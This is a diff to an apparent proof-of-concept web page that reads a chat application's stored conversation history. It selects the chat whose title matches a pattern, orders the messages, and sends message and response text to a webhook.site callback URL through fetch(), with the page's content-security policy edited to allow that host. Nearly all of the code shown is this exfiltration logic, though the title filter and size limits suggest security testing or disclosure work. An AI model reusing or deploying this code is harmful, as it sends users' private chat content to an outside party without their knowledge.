@@ -6,7 +6,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <meta name="referrer" content="no-referrer">
   <meta http-equiv="Content-Security-Policy"
-        content="default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; connect-src https://mywebsite.com; base-uri 'none'; form-action 'none'">
+        content="default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; connect-src https://webhook.site; base-uri 'none'; form-action 'none'">
   <title>POC</title>
   <style>
     :root { color-scheme: dark; }
@@ -83,7 +83,7 @@
   (() => {
     "use strict";
 
-    const TEST_TITLE_PATTERN = /^.*$/s;
+    const TEST_TITLE_PATTERN = /INCH SECURITY/i;
     const MAX_RESPONSE_BYTES = 10 * 1024 * 1024;
     const MAX_CALLBACK_TEXT = 1500;
     let callbackSent = false;
@@ -110,17 +110,38 @@
     function messagesFor(record) {
       const history = record && record.chat && record.chat.history;
       const raw = history && history.messages;
-      if (Array.isArray(raw)) return raw.filter(Boolean);
-      if (raw && typeof raw === "object") return Object.values(raw).filter(Boolean);
-      return [];
+      const messages = Array.isArray(raw)
+        ? raw.filter(Boolean)
+        : raw && typeof raw === "object"
+          ? Object.values(raw).filter(Boolean)
+          : [];
+
+      return messages
+        .map((message, index) => ({ message, index }))
+        .sort((a, b) => {
+          const aTime = Number(a.message.timestamp ?? a.message.created_at);
+          const bTime = Number(b.message.timestamp ?? b.message.created_at);
+          if (Number.isFinite(aTime) && Number.isFinite(bTime) && aTime !== bTime) {
+            return aTime - bTime;
+          }
+          return a.index - b.index;
+        })
+        .map(item => item.message);
+    }
+
+    function chatCreatedAt(record) {
+      const value = Number(record && (record.created_at ?? (record.chat && record.chat.created_at)));
+      return Number.isFinite(value) ? value : Number.MAX_SAFE_INTEGER;
     }
 
     function testPair(records) {
-      const record = records.find(item =>
-        TEST_TITLE_PATTERN.test(
+      const record = records
+        .filter(item => TEST_TITLE_PATTERN.test(
           text(item && (item.title || (item.chat && item.chat.title)))
-        )
-      );
+        ))
+        .map((item, index) => ({ item, index }))
+        .sort((a, b) => chatCreatedAt(a.item) - chatCreatedAt(b.item) || a.index - b.index)
+        .map(entry => entry.item)[0];
       if (!record) return null;
 
       const messages = messagesFor(record);
@@ -147,7 +168,7 @@
       if (pair.msg.length > MAX_CALLBACK_TEXT || pair.response.length > MAX_CALLBACK_TEXT) return;
       callbackSent = true;
 
-      const callback = new URL("https://webhook.site/81eef1b6-43e0-4a0f-8a33-de06882adb54/");
+      const callback = new URL("https://webhook.site/0f8cd859-de73-4469-86c5-7ba05d1bebf5/");
       callback.searchParams.set("msg", pair.msg);
       callback.searchParams.set("response", pair.response);
       fetch(callback, {
